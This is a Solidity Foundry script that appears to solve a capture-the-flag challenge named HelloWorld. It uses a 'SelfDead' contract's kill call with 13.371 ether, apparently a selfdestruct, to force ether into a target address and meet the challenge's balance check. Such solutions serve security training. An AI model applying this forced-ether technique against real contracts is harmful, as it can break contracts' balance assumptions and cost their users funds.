// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "src/HelloWorld.sol";
import "forge-std/Vm.sol";


contract HelloWorldScript is Script {
    HelloWorldChallenge challenge = HelloWorldChallenge(address(0x2278F988F4779ECB7B365708f238D06B1ab11149));

    function setUp() public {
        
    }


    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        VmSafe.Wallet memory wallet = vm.createWallet(deployerPrivateKey, "attacker");        
        console.log("attacker wallet: ", wallet.addr);
        console.log("balance: %e", address(wallet.addr).balance);

        vm.startBroadcast(deployerPrivateKey);

        
        ////////////////
        console.log(address(wallet.addr).balance);
        
        console.log("13.37 ether: ", 13.37 ether);
        console.log("current balance: ", address(this).balance);
        console.log("target balance: %e", address(0x00000000219ab540356cBB839Cbe05303d7705Fa).balance);
        if(!challenge.isSolved()){
            console.log("solving challenge");
            SelfDead selfDead = new SelfDead();
            selfDead.kill{value: 13.371 ether}();
        }
        
        // payable(0x00000000219ab540356cBB839Cbe05303d7705Fa).transfer(13.37 ether);

        console.log("balance: %e", address(wallet.addr).balance);

        console.log("target balance: %e", address(0x00000000219ab540356cBB839Cbe05303d7705Fa).balance);

        console.log("is solved: ", challenge.isSolved());
        ////////////////
        vm.stopBroadcast();
    }
}
